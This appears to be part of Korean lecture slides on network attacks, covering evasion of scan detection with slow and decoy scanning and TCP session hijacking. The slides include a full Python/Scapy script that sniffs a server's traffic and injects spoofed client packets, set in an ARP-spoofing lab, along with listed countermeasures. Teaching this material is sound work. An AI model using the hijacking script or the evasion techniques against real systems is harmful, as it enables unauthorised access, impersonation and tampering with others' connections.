+  ⇒ 공격자가 정상 IP로 스푸핑하여 포트 스캔을 수행하면 어떻게 될까?
+ •e.g., DNS IP, gateway IP....
+
+
+
+‣ 필수 네트워크 차단을 방지하기 위해 화이트리스트 또는 타임아웃 메커니즘이 필요
+
+
+
+
+                                        57
+Countermeasure to countermeasure
+‣ Slow scanning
+ •스캔 속도 늦추기
+ •또는 트래픽 전송 패턴 조절
+
+‣ Decoy Scanning
+ •다양한 스푸핑 IP 주소 사용
+ •또는 프록시 서버 또는 VPN 사용
+
+‣ Port sweeping
+ •여러 호스트에 걸쳐서 '특정 타겟 개방 포트'를 검색하는 방법
+ •(네트워크 내에서 특정 서비스를 실행하는 시스템을 찾기)
+
+
+
+
+                           58
+TCP session hijacking
+
+
+
+
+               59
+TCP Session hijacking
+‣ 유효한 TCP 세션을 탈취하는 공격
+ •세션 내 패킷을 분석하여 TCP 시퀀스/ACK 번호의 패턴을 파악
+ •그런 다음 공격자는 시퀀스 번호 패턴을 사용하여 가짜 패킷을 생성!
+
+
+
+‣ 무단 접속, 데이터 조작, 사용자 사칭, 보안 인증 우회 등에 활용...!
+
+
+
+
+                            60
+Strategy
+‣ 0. ARP 스푸핑(또는 다른 방법)을 수행하여 패킷을 검색하는 경우
+
+‣ 1. 가로챈 패킷에 ACK 또는 ACK/PUSH 플래그가 있는지 확인
+  •세션이 맺어진 연결인지 확인하는 것 (세션탐색이라고 합니다)
+
+‣ 2. 패킷이 서버에서 클라이언트로 전송된 경우 IP 주소를 확인
+  •서버에 패킷을 주입하기 위한 것
+
+‣ 3. 시퀀스 추적 및 승인 번호 확인
+
+‣ 4. 해당 시퀀스/ACK 번호로 패킷을 작성하여 서버로 전송
+
+‣ 5. Profit!!!
+
+
+
+
+                           61
+                                            code 1
+#!/usr/bin/python3
+
+import sys
+import getopt
+from scapy.all import *
+
+dev = "h3-eth0"
+srv_port = None
+srv_ip = None
+client_ip = None
+
+def handle_packet(packet):
+    ip = packet.getlayer("IP")
+    tcp = packet.getlayer("TCP")
+    flags = tcp.sprintf("%flags%")
+
+    print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))
+
+    # Check if this is a hijackable packet
+    if tcp.sprintf("%flags%") == "A" or tcp.sprintf("%flags%") == "PA":
+
+        # The packet is from server to client
+        if tcp.sport == srv_port and ip.src == srv_ip:
+
+            print("Got server sequence " + str(tcp.seq))
+            print("Got client sequence " + str(tcp.ack) + "\n")
+
+            print("Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, srv_port))
+            print("Start sending messagge to the server")
+
+            while True:
+              inject_data = input(">> ")
+              inject_data = inject_data+"\n"
+
+                # Spoof packet from client
+                packet = IP(src=ip.dst, dst=ip.src) \
+                         / TCP(sport=tcp.dport, dport=srv_port, seq=tcp.ack, ack=tcp.seq,
+flags="PA") \
+                         / inject_data
+                resp = sr1(packet, iface=dev, verbose=False)
+                tcp = resp.getlayer("TCP")
+
+
+
+                                                62
+                                        code 2
+def usage():
+    print(sys.argv[0])
+    print("""
+    -c <client_ip> (optional)
+    -s <srv_ip>
+    -p <srv_port>
+    """)
+    sys.exit(1)
+
+try:
+    cmd_opts = "c:s:p:"
+    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
+except getopt.GetoptError:
+    usage()
+
+for opt in opts:
+    if opt[0] == "-c":
+        client_ip = opt[1]
+    elif opt[0] == "-s":
+        srv_ip = opt[1]
+    elif opt[0] == "-p":
+        srv_port = int(opt[1])
+    else:
+        usage()
+
+if not srv_ip and not srv_port:
+    usage()
+
+if client_ip:
+    print("Hijacking TCP connections from %s to " + \
+          "%s on port %d" % (client_ip, srv_ip, srv_port))
+    filter = "tcp and port " + str(srv_port) + \
+              " and host " + srv_ip + "and host " + client_ip
+else:
+    print("Hijacking all TCP connections to " + \
+    "%s on port %d" % (srv_ip, srv_port))
+    filter = "tcp and port " + str(srv_port) + " and host " + srv_ip
+
+sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
+
+
+
+
+                                             63
+Network topology
+
+
+
+
+                                                          Attacker
+                                                       (ARP spoofing)
+
+
+
+                 client                server
+        (# ncat 10.0.0.2 1001)   (# ncat -l -p 1001)
+
+
+
+
+                                  64
+Result
+
+
+
+
+         65
+Countermeasure
+‣ Dynamic sequence number
+ •TCP 세션에서 시퀀스 번호를 동적으로 할당하고 변경하여 예측하기 어렵도록 시스템을 구성
+
+‣ TCP multiplexing
+ •단일 서비스 연결에 여러 TCP 세션을 사용
+
+‣ Session timeout
+ •세션 만료 시간을 설정하여 활성 세션이 열려 있는 시간을 제어
+
+
+
+‣ Encryption
+ •SSL 또는 TLS와 같은 암호화 프로토콜을 사용하여 통신을 암호화
+
+
+
+
+                             66
+조금 어렵습니다...!
+‣ 활성 TCP 세션 존재
+ •공격 대상이 될 만한 활성 세션이 있어야 합니다.
+
+‣ 정확한 시퀀스 번호
+ •하이재킹 성공의 핵심 요소.
+ •스니핑이 가능하지 않다면 거의 불가능에 가까움
+
+‣ IP 스푸핑
+
+‣ 네트워크 위치 (중요)
+ •스니핑이나 응답 패킷 가로채기를 위해서는 동일 네트워크 세그먼트에 위치하는 것이 매우 유리
+
+‣ 암호화되지 않은 프로토콜
+
+
+
+
+                           67
+Summary
+‣ 스니퍼 및 PCAP 덤프
+ •패킷 데이터 감시 및 조회!
+
+‣ IP 스푸핑
+ •IP 패킷의 소스 주소를 수정하여 신원을 숨기거나 다른 컴퓨팅 시스템으로 위장
+
+‣ SYN 플러딩
+ •서버 리소스를 충분히 소모하여 시스템이 정상적인 트래픽에 응답하지 않도록 하기 위해
+  대상 시스템에 SYN 요청을 연속적으로 전송
+
+‣ 포트 스캐닝
+ •네트워크 호스트에서 열려 있는 포트를 검색하여 대상 시스템의 잠재적 취약점을 찾아냄
+
+‣ 및 TCP 세션 하이재킹
+
+
+
+
+                           68
+
